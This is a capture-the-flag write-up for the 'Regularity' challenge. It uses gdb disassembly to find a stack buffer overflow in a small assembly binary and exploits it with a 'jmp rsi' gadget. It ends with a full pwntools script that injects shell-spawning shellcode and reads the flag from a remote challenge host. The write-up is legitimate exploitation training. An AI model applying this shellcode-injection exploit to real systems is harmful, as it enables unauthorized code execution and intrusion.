# HTB Regularity - Shellcode Injection via `jmp rsi`

The challenge binary is written in pure assembly with no libc. We can use `gdb` and run the `info` command to see the entry point. Let's analyze the assembly:
```
(gdb) disassemble 0x401000
Dump of assembler code for function -start:
   0x0000000000401000 <+0>:     mov    $0x1,%edi
   0x0000000000401005 <+5>:     movabs $0x402000,%rsi
   0x000000000040100f <+15>:    mov    $0x2a,%edx
   0x0000000000401014 <+20>:    call   0x401043 <write>
   0x0000000000401019 <+25>:    call   0x40104b <read>
   0x000000000040101e <+30>:    mov    $0x1,%edi
   0x0000000000401023 <+35>:    movabs $0x40202a,%rsi
   0x000000000040102d <+45>:    mov    $0x27,%edx
   0x0000000000401032 <+50>:    call   0x401043 <write>
   0x0000000000401037 <+55>:    movabs $0x40106f,%rsi
   0x0000000000401041 <+65>:    jmp    *%rsi
End of assembler dump.
```

it's a very simple program, it writes some data to the standard output, then reads some data from the standard input, then writes some more data to the standard output. Since our input is used in the `read` function, let's take a look:
```
(gdb) disassemble read
Dump of assembler code for function read:
   0x000000000040104b <+0>:     sub    $0x100,%rsp
   0x0000000000401052 <+7>:     mov    $0x0,%eax
   0x0000000000401057 <+12>:    mov    $0x0,%edi
   0x000000000040105c <+17>:    lea    (%rsp),%rsi
   0x0000000000401060 <+21>:    mov    $0x110,%edx
   0x0000000000401065 <+26>:    syscall
   0x0000000000401067 <+28>:    add    $0x100,%rsp
   0x000000000040106e <+35>:    ret
End of assembler dump.
```

We are creating a buffer of size `0x100` on the stack, and then we read `0x110` bytes into it. This means that we have a buffer overflow vulnerability, and we can overwrite the return address of the function to get a shell.

But we also need to cause the program to jump to our shellcode - we need a gadget. Meaning we need to find a gadget that will allow us to jump to our shellcode.
Our buffer is stored at the `rsi` register:
`lea    (%rsp),%rsi` -> Load effective address of [rsp] into rsi (same as `LEA RSI,[RSP] for Intel`)

As we saw before, we have a `jmp rsi` instruction in 0x401041, so we can use it to jump to our shellcode. We just need to overwrite the return address of the `read` function with the address of the `jmp rsi` instruction.

return address -> jumps to 0x401041 -> jumps to our shellcode -> get a shell

## Exploit

The buffer is `0x100` bytes. We fill it with shellcode, pad to exactly `0x100` bytes, then overwrite the return address with the `jmp rsi` gadget at `0x401041`:

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

payload  = asm(shellcraft.sh())
payload += b'\x90' * (0x100 - len(payload))  # NOP pad to fill buffer
payload += p64(0x401041)                      # jmp rsi gadget

p = remote('154.57.164.83', 31918)
# p = process('./regularity')

p.recv(timeout=2)
p.send(payload)
p.recv(timeout=2)
p.sendline(b'cat flag.txt')
success('Flag: ' + p.recv().decode('utf-8'))
p.interactive()
```

The `jmp rsi` at `0x401041` redirects execution to the start of our buffer, which `rsi` still points to after the `lea (%rsp),%rsi` in the `read` function. The shellcode spawns a shell and we grab the flag.

